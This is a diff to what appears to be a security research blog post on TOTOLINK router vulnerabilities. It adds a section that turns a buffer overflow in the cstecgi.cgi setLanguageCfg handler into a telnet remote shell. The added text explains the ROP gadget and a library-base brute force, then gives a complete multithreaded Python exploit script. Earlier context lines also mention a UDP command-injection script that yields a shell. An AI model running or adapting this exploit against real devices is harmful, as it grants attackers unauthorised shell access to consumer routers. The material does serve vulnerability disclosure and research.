@@ -153,7 +153,7 @@ udp        0      0 0.0.0.0:9034            0.0.0.0:*                           
 
 In the `main` function, I can see it try to `recvfrom` socket, compare with some string like `orf`, `irf`,... Then use `strcat` to complete the command and pass it to `command`. We can inject our command easily. 
 
-![](pics/updserver_func.png)
+![](pics/updserver_func.pngpng)
 
 So I write a script for it:
 
@@ -212,7 +212,7 @@ Here is the result:
 
 ![](pics/udpserer_shell.png)
 
-### BOF -> DDOS
+### BOF -> DDOS or ...
 We back to `cstecgi.cgi`, in the function at address `0x41f404` (this is the handler for `setLanguageCfg`). First the program parse 2 argv from `POST` request, then it check file `/var/userdata/product.ini` is exist, then the program will create a string from hardcoded string `helpUrl_` and our argv. 
 
 ![](pics/setlangcfg_func.PNG)
@@ -265,3 +265,116 @@ Result:
   <source src="/blogs_file_attached\totolink_t6/ddos.mp4" type="video/mp4">
   Your browser does not support the video tag.
 </video>
+
+But I want to do more than a DOS !! To archive that, we need to find a helpful gadget that does 2 things:
+- We want to control register like `a0`, `a1`,... to prepare the param for next call.
+- We want to call `system` function to execute command in our controlled register.
+
+If we can execute the command `telnetd`, we can turn on the `telnet` service and from that we can have a remote shell. But the problem start when `sprintf` will end when it sees `00` byte, so we cant include the `00` byte in our payload => we cant use any address on the userland like `0x0040xxxx` because it needs `00` byte to create a valid address.<br>
+So I looked at those library and found out there is a string `telnetd` in `/lib/libmystdlib.so`. After that, I found the very powerful gadget in `cstecgi.cgi`. This gadget help me to:
+- Control the `a0` (`a0 = s1`).
+- Call the `system` function.
+
+You might ask, how we control it when we dont even touch the `s1` reg ? The answer is: cleanup part of the function will do that. You can see those reg `s0`, `s1,`, `s2` will be loaded with the value on the stack.
+
+![](pics/cleanup.png)
+
+But now, the hardest part join in. We dont know anything about the address of those library, how the heck we can know the address of `telnetd` string ? You can see the `library_base` start at `0x77xxx000`, we can brute that `xxx` (12 bits). Then we calculate the offset from `libdl-0.9.33.so` to `libmystdlib.so`, its 0x11c000.
+
+![](pics/vmmap.png)
+
+The POC took 30min to run, but we able to get shell through telnet:
+
+![](pics/run_time.png)
+
+The result after we found the telnet port (23):
+
+![](pics/poc.png)
+
+Code:
+
+```python
+import requests, sys, threading, time, queue, random, struct, socket
+
+MAX_ADDR = 2 ** 12
+WORKER_AMOUNT = 4
+
+START_TIME = 0
+
+brute_queue = queue.Queue()
+
+def worker(target_ip):
+    while True:
+        try:
+            brute_val = brute_queue.get_nowait()
+        except queue.Empty:
+            break
+        
+        print("  [-] Trying 0x%x" % brute_val)
+
+        url = f"http://{target_ip}/cgi-bin/cstecgi.cgi"
+
+        brute_base = 0x77000000 
+        telnetd_str_off = 0x5BA4
+
+        brute_val = brute_val * 0x1000 + brute_base # base of /lib/libdl-0.9.33.so
+        brute_val += 0x11c000
+
+        brute_telnet_str = brute_val + telnetd_str_off
+
+        temp = struct.pack("<I", brute_telnet_str)
+
+        payload = b"A" * 324 + temp + b"C" * 4 + b"\x08\x88\x40"
+
+        data = b'''
+        {
+            "topicurl":"setLanguageCfg",
+            "lang":"%s",
+            "langAutoFlag":"sad POC"
+        }
+        ''' % (payload)
+
+        requests.post(url, data=data)
+
+def check_telnet(target_ip):
+    global START_TIME
+    print("[+] Check telnet port !!")
+    while True:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+            sock.settimeout(1)
+            try:
+                sock.connect((target_ip, 23))
+                print(f"[+] Found !!")
+                print(f"[+] Script run: {round(time.time() - START_TIME)}s")
+                os._exit(0)
+            except (socket.timeout, socket.error):
+                continue
+        time.sleep(1)
+
+if __name__ == "__main__":
+    if len(sys.argv) != 2:
+        print(f"[-] Usage: {sys.argv[0]} target_ip")
+        exit(0)
+
+    START_TIME = time.time()
+    print(f"[+] Wish me luck !!")
+    
+    brutes = list(range(0x10, MAX_ADDR))
+    random.shuffle(brutes)
+
+    for brute in brutes:
+        brute_queue.put(brute)
+    
+    threads = []
+    for _ in range(WORKER_AMOUNT):
+        t = threading.Thread(target=worker, args=(sys.argv[1],))
+        t.start()
+        threads.append(t)
+
+    t2 = threading.Thread(target=check_telnet, args=(sys.argv[1],))
+    t2.start()
+    threads.append(t2)
+
+    for t in threads:
+        t.join()
+```
